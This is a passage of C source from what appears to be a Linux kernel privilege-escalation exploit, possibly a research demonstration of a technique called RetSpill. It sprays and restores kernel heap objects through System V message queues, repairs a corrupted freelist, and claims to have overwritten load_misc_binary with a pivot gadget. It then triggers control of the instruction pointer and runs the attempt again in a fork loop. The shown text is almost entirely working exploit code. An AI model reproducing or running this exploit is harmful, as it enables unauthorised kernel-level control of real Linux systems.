        memmove(&buffer[0xfd0], timerfd_backup, 0xe0);
		ret = msgsnd(payload_msgqid, buffer, 0x1000+0x100-0x30-0x30, IPC_NOWAIT); // restore the original timerfd

        close(lower_tfd);
		usleep(NAP_TIME);

		// now fix freelist
        ret = msgrcv(padding_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
        ret = msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
        *(u64 *)&buffer[0xfe0+0x80] = null_hash2;
        ret = msgsnd(lower_msgqid, buffer, 0x1000+0xd0-0x30, IPC_NOWAIT);
		msgsnd(padding_msgqid, buffer, 0x1000+0xd0-0x30, IPC_NOWAIT);

		// now finalize
		for(int i=0; i<0x100; i++) msgget(IPC_PRIVATE, 0644 | IPC_CREAT);

	}

	// at this moment, we know load_misc_binary is overwritten by our pivot gadget
	// now use RetSpill to demonstrate arbitrary read/write/function call
	puts("load_misc_binary overwritten\n\n\n\n");
	busy_sleep(1);

	// create the file for triggering PC control
	int fd = open(path_ptr, O_WRONLY|O_CREAT, 0755);
	write(fd, "BBBB", 4);
	close(fd);

	check_cfhp();
	RetSpill_demo();
}

void main(int argc, char *argv)
{
	increase_limit();

	// overwrite load_misc_binary with 

	while(1) {
		if(!fork()) attempt();
		else {
			wait(NULL);
		}
	}
}

